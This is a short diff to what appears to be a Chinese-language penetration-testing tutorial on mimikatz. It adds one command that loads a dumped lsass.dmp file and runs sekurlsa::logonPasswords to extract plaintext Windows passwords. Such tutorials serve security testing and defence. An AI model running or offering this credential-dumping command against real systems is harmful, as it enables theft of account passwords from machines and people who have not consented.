@@ -31,4 +31,5 @@
 ![xx](https://raw.githubusercontent.com/1120362990/Paper/master/images/paper-mimikatz-3.png)
 
 在windows主机中运行如下命令，对导出的lsass文件进行分析即可得到明文密码  
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit  
 ![xx](https://raw.githubusercontent.com/1120362990/Paper/master/images/paper-mimikatz-4.png)
